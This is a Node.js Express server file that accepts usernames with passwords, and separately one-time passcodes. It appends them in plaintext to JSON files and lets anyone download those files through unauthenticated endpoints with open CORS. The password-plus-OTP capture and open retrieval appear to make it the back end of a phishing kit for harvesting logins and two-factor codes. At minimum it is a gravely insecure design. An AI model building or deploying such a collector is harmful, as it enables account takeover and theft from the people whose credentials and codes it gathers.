const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(cors());
app.use(express.static('public'));

// Endpoint for login credentials
app.post('/api/credentials', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'Missing username or password' });
    }

    // Save credentials to credentials.json
    const credentials = { username, password, timestamp: new Date().toISOString() };
    const filePath = path.join(__dirname, 'credentials.json');

    // Read existing credentials or initialize empty array
    let credentialsList = [];
    try {
        if (fs.existsSync(filePath)) {
            const fileContent = fs.readFileSync(filePath, 'utf8');
            credentialsList = JSON.parse(fileContent);
            if (!Array.isArray(credentialsList)) {
                credentialsList = [];
            }
        }
    } catch (error) {
        console.error('Error reading credentials.json:', error);
    }

    // Append new credentials
    credentialsList.push(credentials);

    // Write back to credentials.json
    fs.writeFile(filePath, JSON.stringify(credentialsList, null, 2), (error) => {
        if (error) {
            console.error('Error writing to credentials.json:', error);
            return res.status(500).json({ error: 'Failed to save credentials' });
        }
        res.status(200).json({ message: 'Credentials saved successfully' });
    });
});

// Endpoint for OTP
app.post('/api/otp', (req, res) => {
    const { username, otp } = req.body;

    if (!username || !otp) {
        return res.status(400).json({ error: 'Missing username or OTP' });
    }

    // Save OTP to otp.json
    const otpData = { username, otp, timestamp: new Date().toISOString() };
    const filePath = path.join(__dirname, 'otp.json');

    // Read existing OTPs or initialize empty array
    let otps = [];
    try {
        if (fs.existsSync(filePath)) {
            const fileContent = fs.readFileSync(filePath, 'utf8');
            otps = JSON.parse(fileContent);
            if (!Array.isArray(otps)) {
                otps = [];
            }
        }
    } catch (error) {
        console.error('Error reading otp.json:', error);
    }

    // Append new OTP
    otps.push(otpData);

    // Write back to otp.json
    fs.writeFile(filePath, JSON.stringify(otps, null, 2), (error) => {
        if (error) {
            console.error('Error writing to otp.json:', error);
            return res.status(500).json({ error: 'Failed to save OTP' });
        }
        res.status(200).json({ message: 'OTP saved successfully' });
    });
});

// Endpoint to download credentials.json
app.get('/api/credentials-file', (req, res) => {
    const filePath = path.join(__dirname, 'credentials.json');
    if (fs.existsSync(filePath)) {
        res.download(filePath, 'credentials.json', (error) => {
            if (error) {
                console.error('Error downloading credentials.json:', error);
                res.status(500).json({ error: 'Failed to download credentials file' });
            }
        });
    } else {
        res.status(404).json({ error: 'Credentials file not found' });
    }
});

// Endpoint to download otp.json
app.get('/api/otp-file', (req, res) => {
    const filePath = path.join(__dirname, 'otp.json');
    if (fs.existsSync(filePath)) {
        res.download(filePath, 'otp.json', (error) => {
            if (error) {
                console.error('Error downloading otp.json:', error);
                res.status(500).json({ error: 'Failed to download OTP file' });
            }
        });
    } else {
        res.status(404).json({ error: 'OTP file not found' });
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});